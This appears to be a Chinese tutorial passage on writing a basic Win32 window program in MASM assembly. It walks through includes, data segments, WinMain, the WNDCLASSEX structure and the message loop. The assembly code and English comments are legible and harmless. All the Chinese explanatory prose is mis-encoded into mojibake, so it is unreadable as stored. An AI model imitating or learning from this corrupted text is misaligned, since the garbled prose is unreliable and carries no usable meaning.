¼éµå®ˆç¼–ç¨‹è§„èŒƒï¼Œå¹¶å…»æˆè‰¯å¥½çš„ç¼–ç¨‹é£æ ¼ã€‚\nå†…å®¹ï¼š ä¸‹é¢æ˜¯æˆ‘ä»¬ç®€å•çš„çª—å£ç¨‹åºçš„æºä»£ç ã€‚åœ¨è¿›å…¥å¤æ‚çš„ä»£ç å‰ï¼ŒæŒ‡å‡ºå‡ ç‚¹è¦ç‚¹ï¼š\næ‚¨åº”å½“æŠŠç¨‹åºä¸­è¦ç”¨åˆ°çš„æ‰€æœ‰å¸¸é‡å’Œç»“æ„ä½“çš„å£°æ˜æ”¾åˆ°ä¸€ä¸ªå¤´æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”åœ¨æºç¨‹åºçš„å¼€å§‹å¤„åŒ…å«è¿™ä¸ªå¤´æ–‡ä»¶ã€‚è¿™ä¹ˆåšå°†ä¼šèŠ‚çœæ‚¨å¤§é‡çš„æ—¶é—´ï¼Œä¹Ÿå…å¾—ä¸€æ¬¡åˆä¸€æ¬¡çš„æ•²é”®ç›˜ã€‚ç›®å‰ï¼Œæˆ‘æ‰€ä½¿ç”¨çš„æ˜¯masm32.comæä¾›çš„ã€‚æ‚¨ä¹Ÿå¯ä»¥å®šä¹‰æ‚¨è‡ªå·±çš„å¸¸é‡å’Œç»“æ„ä½“ï¼Œä½†æœ€å¥½æŠŠå®ƒä»¬æ”¾åˆ°ç‹¬ç«‹çš„å¤´æ–‡ä»¶ä¸­ ç”¨ includelib æŒ‡ä»¤ï¼ŒåŒ…å«æ‚¨çš„ç¨‹åºè¦å¼•ç”¨çš„åº“æ–‡ä»¶ï¼Œè­¬å¦‚ï¼šè‹¥æ‚¨çš„ç¨‹åºè¦è°ƒç”¨ \u0026ldquo;MessageBox\u0026rdquo;ï¼Œ æ‚¨å°±åº”å½“åœ¨æºæ–‡ä»¶ä¸­åŠ å…¥å¦‚ä¸‹ä¸€è¡Œï¼š includelib user32.lib è¿™æ¡è¯­å¥å‘Šè¯‰ MASM æ‚¨çš„ç¨‹åºå°†è¦ç”¨åˆ°ä¸€äº›å¼•å…¥åº“ã€‚å¦‚æœæ‚¨ä¸æ­¢å¼•ç”¨ä¸€ä¸ªåº“ï¼Œåªè¦ç®€å•åœ°åŠ å…¥ includelib è¯­å¥ï¼Œä¸è¦æ‹…å¿ƒé“¾æ¥å™¨å¦‚ä½•å¤„ç†è¿™ä¹ˆå¤šçš„åº“ï¼Œåªè¦åœ¨é“¾æ¥æ—¶ç”¨é“¾æ¥å¼€å…³ /LIBPATH æŒ‡æ˜åº“æ‰€åœ¨çš„è·¯å¾„å³å¯ã€‚ åœ¨å…¶å®ƒåœ°æ–¹è¿ç”¨å¤´æ–‡ä»¶ä¸­å®šä¹‰å‡½æ•°åŸå‹ï¼Œå¸¸æ•°å’Œç»“æ„ä½“æ—¶ï¼Œè¦ä¸¥æ ¼ä¿æŒå’Œå¤´æ–‡ä»¶ä¸­çš„å®šä¹‰ä¸€è‡´ï¼ŒåŒ…æ‹¬å¤§å°å†™ã€‚åœ¨æŸ¥è¯¢å‡½æ•°å®šä¹‰æ—¶ï¼Œè¿™å°†èŠ‚çº¦æ‚¨å¤§é‡çš„æ—¶é—´ï¼› åœ¨ç¼–è¯‘ï¼Œé“¾æ¥æ—¶ç”¨makefileæ–‡ä»¶ï¼Œå…å»é‡å¤æ•²é”®ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 .386 .model flat,stdcall option casemap:none include windows.inc include user32.inc includelib user32.lib ; calls to functions in user32.lib and kernel32.lib include kernel32.inc includelib kernel32.lib WinMain proto :DWORD,:DWORD,:DWORD,:DWORD .DATA ; initialized data ClassName db \u0026#34;SimpleWinClass\u0026#34;,0 ; the name of our window class AppName db \u0026#34;Our First Window\u0026#34;,0 ; the name of our window .DATA? ; Uninitialized data hInstance HINSTANCE ? ; Instance handle of our program CommandLine LPSTR ? .CODE ; Here begins our code start: invoke GetModuleHandle, NULL ; get the instance handle of our program. ; Under Win32, hmodule==hinstance mov hInstance,eax mov hInstance,eax invoke GetCommandLine ; get the command line. You don\u0026#39;t have to call this function IF ; your program doesn\u0026#39;t process the command line. mov CommandLine,eax invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT ; call the main function invoke ExitProcess, eax ; quit our program. The exit code is returned in eax from WinMain. WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD LOCAL wc:WNDCLASSEX ; create local variables on stack LOCAL msg:MSG LOCAL hwnd:HWND mov wc.cbSize,SIZEOF WNDCLASSEX ; fill values in members of wc mov wc.style, CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProc, OFFSET WndProc mov wc.cbClsExtra,NULL mov wc.cbWndExtra,NULL push hInstance pop wc.hInstance mov wc.hbrBackground,COLOR_WINDOW+1 mov wc.lpszMenuName,NULL mov wc.lpszClassName,OFFSET ClassName invoke LoadIcon,NULL,IDI_APPLICATION mov wc.hIcon,eax mov wc.hIconSm,eax invoke LoadCursor,NULL,IDC_ARROW mov wc.hCursor,eax invoke RegisterClassEx, addr wc ; register our window class invoke CreateWindowEx,NULL,\\ ADDR ClassName,\\ ADDR AppName,\\ WS_OVERLAPPEDWINDOW,\\ CW_USEDEFAULT,\\ CW_USEDEFAULT,\\ CW_USEDEFAULT,\\ CW_USEDEFAULT,\\ NULL,\\ NULL,\\ hInst,\\ NULL mov hwnd,eax invoke ShowWindow, hwnd,CmdShow ; display our window on desktop invoke UpdateWindow, hwnd ; refresh the client area .WHILE TRUE ; Enter message loop invoke GetMessage, ADDR msg,NULL,0,0 .BREAK .IF (!eax) invoke TranslateMessage, ADDR msg invoke DispatchMessage, ADDR msg .ENDW mov eax,msg.wParam ; return exit code in eax ret WinMain endp WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM .IF uMsg==WM_DESTROY ; if the user closes our window invoke PostQuitMessage,NULL ; quit our application .ELSE invoke DefWindowProc,hWnd,uMsg,wParam,lParam ; Default message processing ret .ENDIF xor eax,eax ret WndProc endp end start åˆ†æï¼š çœ‹åˆ°ä¸€ä¸ªç®€å•çš„ Windows ç¨‹åºæœ‰è¿™ä¹ˆå¤šè¡Œï¼Œæ‚¨æ˜¯ä¸æ˜¯æœ‰ç‚¹æƒ³æ­»? ä½†æ˜¯æ‚¨å¿…é¡»è¦çŸ¥é“çš„æ˜¯ä¸Šé¢çš„å¤§å¤šæ•°ä»£ç éƒ½æ˜¯æ¨¡æ¿è€Œå·²ï¼Œæ¨¡æ¿çš„æ„æ€å³æ˜¯æŒ‡è¿™äº›ä»£ç å¯¹å·®ä¸å¤šæ‰€æœ‰æ ‡å‡† Windows ç¨‹åºæ¥è¯´éƒ½æ˜¯ç›¸åŒçš„ã€‚åœ¨å†™ Windows ç¨‹åºæ—¶æ‚¨å¯ä»¥æŠŠè¿™äº›ä»£ç æ‹·æ¥æ‹·å»ï¼Œå½“ç„¶æŠŠè¿™äº›é‡å¤çš„ä»£ç å†™åˆ°ä¸€ä¸ªåº“ä¸­ä¹ŸæŒºå¥½ã€‚å…¶å®çœŸæ­£è¦å†™çš„ä»£ç é›†ä¸­åœ¨ WinMain ä¸­ã€‚è¿™å’Œä¸€äº› C ç¼–è¯‘å™¨ä¸€æ ·ï¼Œæ— é¡»è¦å…³å¿ƒå…¶å®ƒæ‚åŠ¡ï¼Œé›†ä¸­ç²¾åŠ›äº WinMain å‡½æ•°ã€‚å”¯ä¸€ä¸åŒçš„æ˜¯ C ç¼–è¯‘å™¨è¦æ±‚æ‚¨çš„æºä»£ç æœ‰å¿…é¡»æœ‰ä¸€ä¸ªå‡½æ•°å« WinMainã€‚å¦åˆ™ C æ— æ³•çŸ¥é“å°†å“ªä¸ªå‡½æ•°å’Œæœ‰å…³çš„å‰åä»£ç é“¾æ¥ã€‚ç›¸å¯¹Cï¼Œæ±‡ç¼–è¯­è¨€æä¾›äº†è¾ƒå¤§çš„çµæ´»æ€§ï¼Œå®ƒä¸å¼ºè¡Œè¦æ±‚ä¸€ä¸ªå« WinMain çš„å‡½æ•°ã€‚\nåšå¥½å¿ƒç†å‡†å¤‡ï¼Œä¸‹é¢æˆ‘ä»¬å¼€å§‹åˆ†æä»£ç ã€‚\n1 2 3 4 5 6 7 8 9 10 11 .386 .model flatï¼Œstdcall option casemapï¼šnone WinMain proto ï¼šDWORDï¼Œï¼šDWORDï¼Œï¼šDWORDï¼Œï¼šDWORD include windows.inc include user32.inc include kernel32.inc includelib user32.lib includelib kernel32.lib æ‚¨å¯ä»¥æŠŠå‰ä¸‰è¡Œçœ‹æˆæ˜¯\u0026quot;å¿…é¡»\u0026quot;çš„.\n.386å‘Šè¯‰MASNæˆ‘ä»¬è¦ç”¨80386æŒ‡ä»¤é›†ã€‚\n. model flatï¼Œstdcallå‘Šè¯‰MASM æˆ‘ä»¬ç”¨çš„å†…å­˜å¯»å€æ¨¡å¼ï¼Œæ­¤å¤„ä¹Ÿå¯ä»¥åŠ å…¥stdcallå‘Šè¯‰MASMæˆ‘ä»¬æ‰€ç”¨çš„å‚æ•°ä¼ é€’çº¦å®šã€‚\næ¥ä¸‹æ¥æ˜¯å‡½æ•° WinMain çš„åŸå‹å£°æ˜ï¼Œå› ä¸ºæˆ‘ä»¬ç¨åè¦ç”¨åˆ°è¯¥å‡½æ•°ï¼Œæ•…å¿…é¡»å…ˆå£°æ˜ã€‚æˆ‘ä»¬å¿…é¡»åŒ…å« window.inc æ–‡ä»¶ï¼Œå› ä¸ºå…¶ä¸­åŒ…å«å¤§é‡è¦ç”¨åˆ°çš„å¸¸é‡å’Œç»“æ„çš„å®šä¹‰ï¼Œè¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ç”¨ä»»ä½•æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€å¹¶ä¸”æŸ¥çœ‹å®ƒ\næˆ‘ä»¬çš„ç¨‹åºè°ƒç”¨ user32.dll (è­¬å¦‚ï¼šCreateWindowExï¼Œ RegisterWindowClassEx) å’Œ kernel32.dll (ExitProcess)ä¸­çš„å‡½æ•°ï¼Œæ‰€ä»¥å¿…é¡»é“¾æ¥è¿™ä¸¤ä¸ªåº“ã€‚æ¥ä¸‹æ¥æˆ‘å¦‚æœé—®ï¼šæ‚¨éœ€è¦æŠŠä»€ä¹ˆåº“é“¾å…¥æ‚¨çš„ç¨‹åºå‘¢ ? ç­”æ¡ˆæ˜¯ï¼šå…ˆæŸ¥åˆ°æ‚¨è¦è°ƒç”¨çš„å‡½æ•°åœ¨ä»€ä¹ˆåº“ä¸­ï¼Œç„¶ååŒ…å«è¿›æ¥ã€‚è­¬å¦‚ï¼šè‹¥æ‚¨è¦è°ƒç”¨çš„å‡½æ•°åœ¨ gdi32.dll ä¸­ï¼Œæ‚¨å°±è¦åŒ…å«gdi32.incå¤´æ–‡ä»¶ã€‚å’Œ MASM ç›¸æ¯”ï¼ŒTASM åˆ™è¦ç®€å•å¾—å¤šï¼Œæ‚¨åªè¦å¼•å…¥ä¸€ä¸ªåº“ï¼Œå³ï¼šimport32.libã€‚\u0026lt;ä½† Tasm5 éº»çƒ¦çš„æ˜¯ windows.inc éå¸¸çš„ä¸å…¨é¢ï¼Œè€Œä¸”å¦‚æœåœ¨ Windows.inc ä¸­åŒ…å«å…¨éƒ¨çš„ API å®šä¹‰ä¼šå†…å­˜ä¸å¤Ÿï¼Œæ‰€ä»¥æ¯æ¬¡ä½ å¾—æŠŠç”¨åˆ°çš„ API å®šä¹‰æ‹·è´å‡ºæ¥\u0026gt;\n1 2 3 4 5 6 7 8 9 .DATA ClassName db \u0026#34;SimpleWinClass\u0026#34;ï¼Œ0 AppName db \u0026#34;Our First Window\u0026#34;ï¼Œ0 .DATA? hInstance HINSTANCE ? CommandLine LPSTR ? æ¥ä¸‹æ¥æ˜¯DATA\u0026ldquo;åˆ†æ®µ\u0026rdquo;ã€‚ åœ¨ .DATA ä¸­æˆ‘ä»¬å®šä¹‰äº†ä¸¤ä¸ªä»¥ NULL ç»“å°¾çš„å­—ç¬¦ä¸² (ASCIIZ)ï¼šå…¶ä¸­ ClassName æ˜¯ Windows ç±»åï¼ŒAppName æ˜¯æˆ‘ä»¬çª—å£çš„åå­—ã€‚è¿™ä¸¤ä¸ªå˜é‡éƒ½æ˜¯åˆå§‹åŒ–äº†çš„ã€‚æœªè¿›è¡Œåˆå§‹åŒ–çš„ä¸¤ä¸ªå˜é‡æ”¾åœ¨ .DATA? \u0026ldquo;åˆ†æ®µ\u0026quot;ä¸­ï¼Œå…¶ä¸­ hInstance ä»£è¡¨åº”ç”¨ç¨‹åºçš„å¥æŸ„ï¼ŒCommandLine ä¿å­˜ä»å‘½ä»¤è¡Œä¼ å…¥çš„å‚æ•°ã€‚HINSTACE å’Œ LPSTR æ˜¯ä¸¤ä¸ªæ•°æ®ç±»å‹åï¼Œå®ƒä»¬åœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰ï¼Œå¯ä»¥çœ‹åšæ˜¯ DWORD çš„åˆ«åï¼Œä¹‹æ‰€ä»¥è¦è¿™ä¹ˆé‡æ–°å®šä»…æ˜¯ä¸ºäº†æ˜“è®°ã€‚æ‚¨å¯ä»¥æŸ¥çœ‹ windows.inc æ–‡ä»¶ï¼Œåœ¨ .DATA? ä¸­çš„å˜é‡éƒ½æ˜¯æœªç»åˆå§‹åŒ–çš„ï¼Œè¿™ä¹Ÿå°±æ˜¯è¯´åœ¨ç¨‹åºåˆšå¯åŠ¨æ—¶å®ƒä»¬çš„å€¼æ˜¯ä»€ä¹ˆæ— å…³ç´§è¦ï¼Œåªä¸è¿‡å æœ‰äº†ä¸€å—å†…å­˜ï¼Œä»¥åå¯ä»¥å†åˆ©ç”¨è€Œå·²ã€‚\n1 2 3 4 5 6 7 8 9 10 .CODE startï¼š invoke GetModuleHandleï¼Œ NULL mov hInstanceï¼Œeax invoke GetCommandLine mov CommandLineï¼Œeax invoke WinMainï¼Œ hInstanceï¼ŒNULLï¼ŒCommandLineï¼Œ SW_SHOWDEFAULT invoke ExitProcessï¼Œeax ..... end start .CODE \u0026ldquo;åˆ†æ®µ\u0026quot;åŒ…å«äº†æ‚¨åº”ç”¨ç¨‹åºçš„æ‰€æœ‰ä»£ç ï¼Œè¿™äº›ä»£ç å¿…é¡»éƒ½åœ¨ .code å’Œ end ä¹‹é—´ã€‚è‡³äº label çš„å‘½ååªè¦éµä» Windows è§„èŒƒè€Œä¸”ä¿è¯å”¯ä¸€åˆ™å…·ä½“å«ä»€ä¹ˆå€’æ˜¯æ— æ‰€è°“ã€‚æˆ‘ä»¬ç¨‹åºçš„ç¬¬ä¸€æ¡è¯­å¥æ˜¯è°ƒç”¨ GetModuleHandle å»æŸ¥æ‰¾æˆ‘ä»¬åº”ç”¨ç¨‹åºçš„å¥æŸ„ã€‚åœ¨Win32ä¸‹ï¼Œåº”ç”¨ç¨‹åºçš„å¥æŸ„å’Œæ¨¡å—çš„å¥æŸ„æ˜¯ä¸€æ ·çš„ã€‚æ‚¨å¯ä»¥æŠŠå®ä¾‹å¥æŸ„çœ‹æˆæ˜¯æ‚¨çš„åº”ç”¨ç¨‹åºçš„ ID å·ã€‚æˆ‘ä»¬åœ¨è°ƒç”¨å‡ ä¸ªå‡½æ•°æ˜¯éƒ½æŠŠå®ƒä½œä¸ºå‚æ•°æ¥è¿›è¡Œä¼ é€’ï¼Œæ‰€ä»¥åœ¨ä¸€å¼€å§‹ä¾¿å¾—åˆ°å¹¶ä¿å­˜å®ƒå°±å¯ä»¥çœè®¸å¤šçš„äº‹ã€‚\nç‰¹åˆ«æ³¨æ„ï¼šWIN32ä¸‹çš„å®ä¾‹å¥æŸ„å®é™…ä¸Šæ˜¯æ‚¨åº”ç”¨ç¨‹åºåœ¨å†…å­˜ä¸­çš„çº¿æ€§åœ°å€ã€‚\n**WIN32 ä¸­å‡½æ•°çš„å‡½æ•°å¦‚æœæœ‰è¿”å›å€¼ï¼Œé‚£å®ƒæ˜¯é€šè¿‡ eax å¯„å­˜å™¨æ¥ä¼ é€’çš„ã€‚å…¶ä»–çš„å€¼å¯ä»¥é€šè¿‡ä¼ é€’è¿›æ¥çš„å‚æ•°åœ°å€è¿›è¡Œè¿”å›ã€‚**ä¸€ä¸ª WIN32 å‡½æ•°è¢«è°ƒç”¨æ—¶æ€»ä¼šä¿å­˜å¥½æ®µå¯„å­˜å™¨å’Œ ebxï¼Œediï¼Œesiå’Œebp å¯„å­˜å™¨ï¼Œè€Œ ecxå’Œedx ä¸­çš„å€¼æ€»æ˜¯ä¸å®šçš„ï¼Œä¸èƒ½åœ¨è¿”å›æ—¶åº”ç”¨ã€‚ç‰¹åˆ«æ³¨æ„ï¼šä» Windows API å‡½æ•°ä¸­è¿”å›åï¼Œeaxï¼Œecxï¼Œedx ä¸­çš„å€¼å’Œè°ƒç”¨å‰ä¸ä¸€å®šç›¸åŒã€‚å½“å‡½æ•°è¿”å›æ—¶ï¼Œè¿”å›å€¼æ”¾åœ¨eaxä¸­ã€‚å¦‚æœæ‚¨åº”ç”¨ç¨‹åºä¸­çš„å‡½æ•°æä¾›ç»™ Windows è°ƒç”¨æ—¶ï¼Œä¹Ÿå¿…é¡»éµå®ˆè¿™ä¸€ç‚¹ï¼Œå³åœ¨å‡½æ•°å…¥å£å¤„ä¿å­˜æ®µå¯„å­˜å™¨å’Œ ebxï¼Œespï¼Œesiï¼Œedi çš„å€¼å¹¶åœ¨å‡½æ•°è¿”å›æ—¶æ¢å¤ã€‚å¦‚æœä¸è¿™æ ·ä¸€æ¥çš„è¯ï¼Œæ‚¨çš„åº”ç”¨ç¨‹åºå¾ˆå¿«ä¼šå´©æºƒã€‚ä»æ‚¨çš„ç¨‹åºä¸­æä¾›ç»™ Windows è°ƒç”¨çš„å‡½æ•°å¤§ä½“ä¸Šæœ‰ä¸¤ç§ï¼šWindows çª—å£è¿‡ç¨‹å’Œ Callback å‡½æ•°ã€‚\nå¦‚æœæ‚¨çš„åº”ç”¨ç¨‹åºä¸å¤„ç†å‘½ä»¤è¡Œé‚£ä¹ˆå°±æ— é¡»è°ƒç”¨ GetCommandLineï¼Œè¿™é‡Œåªæ˜¯å‘Šè¯‰æ‚¨å¦‚æœè¦è°ƒç”¨åº”è¯¥æ€ä¹ˆåšã€‚\nä¸‹é¢åˆ™æ˜¯è°ƒç”¨WinMainäº†ã€‚è¯¥å‡½æ•°å…±æœ‰4ä¸ªå‚æ•°ï¼šåº”ç”¨ç¨‹åºçš„å®ä¾‹å¥æŸ„ï¼Œè¯¥åº”ç”¨ç¨‹åºçš„å‰ä¸€å®ä¾‹å¥æŸ„ï¼Œå‘½ä»¤è¡Œå‚æ•°ä¸²æŒ‡é’ˆå’Œçª—å£å¦‚ä½•æ˜¾ç¤ºã€‚Win32 æ²¡æœ‰å‰ä¸€å®ä¾‹å¥æŸ„çš„æ¦‚å¿µï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªå‚æ•°æ€»ä¸º0ã€‚ä¹‹æ‰€ä»¥ä¿ç•™å®ƒæ˜¯ä¸ºäº†å’Œ Win16 å…¼å®¹çš„è€ƒè™‘ï¼Œåœ¨ Win16ä¸‹ï¼Œå¦‚æœ hPrevInst æ˜¯ NULLï¼Œåˆ™è¯¥å‡½æ•°æ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œã€‚ç‰¹åˆ«æ³¨æ„ï¼šæ‚¨ä¸ç”¨å¿…é¡»å£°æ˜ä¸€ä¸ªåä¸º WinMain å‡½æ•°ï¼Œäº‹å®ä¸Šåœ¨è¿™æ–¹é¢æ‚¨å¯ä»¥å®Œå…¨ä½œä¸»ï¼Œæ‚¨ç”šè‡³æ— é¡»æœ‰ä¸€ä¸ªå’Œ WinMain ç­‰åŒçš„å‡½æ•°ã€‚æ‚¨åªè¦æŠŠ WinMain ä¸­çš„ä»£ç æ‹·åˆ°GetCommandLine ä¹‹åï¼Œå…¶æ‰€å®ç°çš„åŠŸèƒ½å®Œå…¨ç›¸åŒã€‚åœ¨ WinMain è¿”å›æ—¶ï¼ŒæŠŠè¿”å›ç æ”¾åˆ° eax ä¸­ã€‚ç„¶ååœ¨åº”ç”¨ç¨‹åºç»“æŸæ—¶é€šè¿‡ ExitProcess å‡½æ•°æŠŠè¯¥è¿”å›ç ä¼ é€’ç»™ Windows ã€‚\n1 WinMain proc Inst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD ä¸Šé¢æ˜¯WinMainçš„å®šä¹‰ã€‚æ³¨æ„è·Ÿåœ¨ proc æŒ‡ä»¤åçš„parameterï¼štypeå½¢å¼çš„å‚æ•°ï¼Œå®ƒä»¬æ˜¯ç”±è°ƒç”¨è€…ä¼ ç»™ WinMain çš„ï¼Œæˆ‘ä»¬å¼•ç”¨æ˜¯ç›´æ¥ç”¨å‚æ•°åå³å¯ã€‚è‡³äºå‹æ ˆå’Œé€€æ ˆæ—¶çš„å¹³è¡¡å †æ ˆå·¥ä½œç”± MASM åœ¨ç¼–è¯‘æ—¶åŠ å…¥ç›¸å…³çš„å‰åºå’Œååºæ±‡ç¼–æŒ‡ä»¤æ¥è¿›è¡Œã€‚ LOCAL wcï¼šWNDCLASSEX LOCAL msgï¼šMSG LOCAL hwndï¼šHWND LOCAL ä¼ªæŒ‡ä»¤ä¸ºå±€éƒ¨å˜é‡åœ¨æ ˆä¸­åˆ†é…å†…å­˜ç©ºé—´ï¼Œæ‰€æœ‰çš„ LOCAL æŒ‡ä»¤å¿…é¡»ç´§è·Ÿåœ¨ PROC ä¹‹åã€‚LOCAL åè·Ÿå£°æ˜çš„å˜é‡ï¼Œå…¶å½¢å¼æ˜¯ å˜é‡å:å˜é‡ç±»å‹ã€‚è­¬å¦‚ LOCAL wcï¼šWNDCLASSEX å³æ˜¯å‘Šè¯‰ MASM ä¸ºåå­—å« wc çš„å±€éƒ¨è¾¹é‡åœ¨æ ˆä¸­åˆ†é…é•¿åº¦ä¸º WNDCLASSEX ç»“æ„ä½“é•¿åº¦çš„å†…å­˜ç©ºé—´ï¼Œç„¶åæˆ‘ä»¬åœ¨ç”¨è¯¥å±€éƒ¨å˜é‡æ˜¯æ— é¡»è€ƒè™‘å †æ ˆçš„é—®é¢˜ï¼Œè€ƒè™‘åˆ° DOS ä¸‹çš„æ±‡ç¼–ï¼Œè¿™ä¸èƒ½ä¸è¯´æ˜¯ä¸€ç§æ©èµã€‚ä¸è¿‡è¿™å°±è¦æ±‚è¿™æ ·å£°æ˜çš„å±€éƒ¨å˜é‡åœ¨å‡½æ•°ç»“æŸæ—¶é‡Šæ”¾æ ˆç©ºé—´ï¼Œ(ä¹Ÿå³ä¸èƒ½åœ¨å‡½æ•°ä½“å¤–è¢«å¼•ç”¨)ï¼Œå¦ä¸€ä¸ªç¼ºç‚¹æ˜¯æ‚¨å› ä¸èƒ½åˆå§‹åŒ–æ‚¨çš„å±€éƒ¨å˜é‡ï¼Œä¸å¾—ä¸åœ¨ç¨åå¦å¤–å†å¯¹å…¶èµ‹å€¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 mov wc.cbSizeï¼ŒSIZEOF WNDCLASSEX mov wc.styleï¼Œ CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProcï¼Œ OFFSET WndProc mov wc.cbClsExtraï¼ŒNULL mov wc.cbWndExtraï¼ŒNULL push hInstance pop wc.hInstance mov wc.hbrBackgroundï¼ŒCOLOR_WINDOW+1 mov wc.lpszMenuNameï¼ŒNULL mov wc.lpszClassNameï¼ŒOFFSET ClassName invoke LoadIconï¼ŒNULLï¼ŒIDI_APPLICATION mov wc.hIconï¼Œeax mov wc.hIconSmï¼Œeax invoke LoadCursorï¼ŒNULLï¼ŒIDC_ARROW mov wc.hCursorï¼Œeax invoke RegisterClassExï¼Œ addr w ä¸Šé¢å‡ è¡Œä»æ¦‚å¿µä¸Šè¯´ç¡®å®æ˜¯éå¸¸åœ°ç®€å•ã€‚åªè¦å‡ è¡ŒæŒ‡ä»¤å°±å¯ä»¥å®ç°ã€‚å…¶ä¸­çš„ä¸»è¦æ¦‚å¿µå°±æ˜¯çª—å£ç±»ï¼ˆwindow classï¼‰ï¼Œä¸€ä¸ªçª—å£ç±»å°±æ˜¯ä¸€ä¸ªæœ‰å…³çª—å£çš„è§„èŒƒï¼Œè¿™ä¸ªè§„èŒƒå®šä¹‰äº†å‡ ä¸ªä¸»è¦çš„çª—å£çš„å…ƒç´ ï¼Œå¦‚ï¼šå›¾æ ‡ã€å…‰æ ‡ã€èƒŒæ™¯è‰²ã€å’Œè´Ÿè´£å¤„ç†è¯¥çª—å£çš„å‡½æ•°ã€‚æ‚¨äº§ç”Ÿä¸€ä¸ªçª—å£æ—¶å°±å¿…é¡»è¦æœ‰è¿™æ ·çš„ä¸€ä¸ªçª—å£ç±»ã€‚å¦‚æœæ‚¨è¦äº§ç”Ÿä¸æ­¢ä¸€ä¸ªåŒç§ç±»å‹çš„çª—å£æ—¶ï¼Œæœ€å¥½çš„æ–¹æ³•å°±æ˜¯æŠŠè¿™ä¸ªçª—å£ç±»å­˜å‚¨èµ·æ¥ï¼Œè¿™ç§æ–¹æ³•å¯ä»¥èŠ‚çº¦è®¸å¤šçš„å†…å­˜ç©ºé—´ã€‚ä¹Ÿè®¸ä»Šå¤©æ‚¨ä¸ä¼šå¤ªæ„Ÿè§‰åˆ°ï¼Œå¯æ˜¯æƒ³æƒ³ä»¥å‰ PC å¤§å¤šæ•°åªæœ‰ 1M å†…å­˜æ—¶ï¼Œè¿™ä¹ˆåšæ˜¯éå¸¸æœ‰å¿…è¦çš„ã€‚å¦‚æœæ‚¨è¦å®šä¹‰è‡ªå·±çš„åˆ›å»ºçª—å£ç±»å°±å¿…é¡»ï¼šåœ¨ä¸€ä¸ª WINDCLASS æˆ– WINDOWCLASSEXE ç»“æ„ä½“ä¸­æŒ‡æ˜æ‚¨çª—å£çš„ç»„æˆå…ƒç´ ï¼Œç„¶åè°ƒç”¨ RegisterClass æˆ– RegisterClassEx ï¼Œå†æ ¹æ®è¯¥çª—å£ç±»äº§ç”Ÿçª—å£ã€‚å¯¹ä¸åŒç‰¹è‰²çš„çª—å£å¿…é¡»å®šä¹‰ä¸åŒçš„çª—å£ç±»ã€‚ WINDOWSæœ‰å‡ ä¸ªé¢„å®šä¹‰çš„çª—å£ç±»ï¼Œè­¬å¦‚ï¼šæŒ‰é’®ã€ç¼–è¾‘æ¡†ç­‰ã€‚è¦äº§ç”Ÿè¯¥ç§é£æ ¼çš„çª—å£æ— é¡»é¢„å…ˆå†å®šä¹‰çª—å£ç±»äº†ï¼Œåªè¦åŒ…é¢„å®šä¹‰ç±»çš„ç±»åä½œä¸ºå‚æ•°è°ƒç”¨ CreateWindowEx å³å¯ã€‚\nWNDCLASSEX ä¸­æœ€é‡è¦çš„æˆå‘˜è«è¿‡äºlpfnWndProcäº†ã€‚å‰ç¼€ lpfn è¡¨ç¤ºè¯¥æˆå‘˜æ˜¯ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„é•¿æŒ‡é’ˆã€‚åœ¨ Win32ä¸­ç”±äºå†…å­˜æ¨¡å¼æ˜¯ FLAT å‹ï¼Œæ‰€ä»¥æ²¡æœ‰ near æˆ– far çš„åŒºåˆ«ã€‚æ¯ä¸€ä¸ªçª—å£ç±»å¿…é¡»æœ‰ä¸€ä¸ªçª—å£è¿‡ç¨‹ï¼Œå½“ Windows æŠŠå±äºç‰¹å®šçª—å£çš„æ¶ˆæ¯å‘é€ç»™è¯¥çª—å£æ—¶ï¼Œè¯¥çª—å£çš„çª—å£ç±»è´Ÿè´£å¤„ç†æ‰€æœ‰çš„æ¶ˆæ¯ï¼Œå¦‚é”®ç›˜æ¶ˆæ¯æˆ–é¼ æ ‡æ¶ˆæ¯ã€‚ç”±äºçª—å£è¿‡ç¨‹å·®ä¸å¤šæ™ºèƒ½åœ°å¤„ç†äº†æ‰€æœ‰çš„çª—å£æ¶ˆæ¯å¾ªç¯ï¼Œæ‰€ä»¥æ‚¨åªè¦åœ¨å…¶ä¸­åŠ å…¥æ¶ˆæ¯å¤„ç†è¿‡ç¨‹å³å¯ã€‚ä¸‹é¢æˆ‘å°†è¦è®²è§£ WNDCLASSEX çš„æ¯ä¸€ä¸ªæˆå‘˜\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 WNDCLASSEX STRUCT DWORD cbSize DWORD ? style DWORD ? lpfnWndProc DWORD ? cbClsExtra DWORD ? cbWndExtra DWORD ? hInstance DWORD ? hIcon DWORD ? hCursor DWORD ? hbrBackground DWORD ? lpszMenuName DWORD ? lpszClassName DWORD ? hIconSm DWORD ? WNDCLASSEX ENDS cbSizeï¼šWNDCLASSEX çš„å¤§å°ã€‚æˆ‘ä»¬å¯ä»¥ç”¨sizeofï¼ˆWNDCLASSEXï¼‰æ¥è·å¾—å‡†ç¡®çš„å€¼ã€‚ styleï¼šä»è¿™ä¸ªçª—å£ç±»æ´¾ç”Ÿçš„çª—å£å…·æœ‰çš„é£æ ¼ã€‚æ‚¨å¯ä»¥ç”¨â€œorâ€æ“ä½œç¬¦æ¥æŠŠå‡ ä¸ªé£æ ¼æˆ–åˆ°ä¸€èµ·ã€‚ 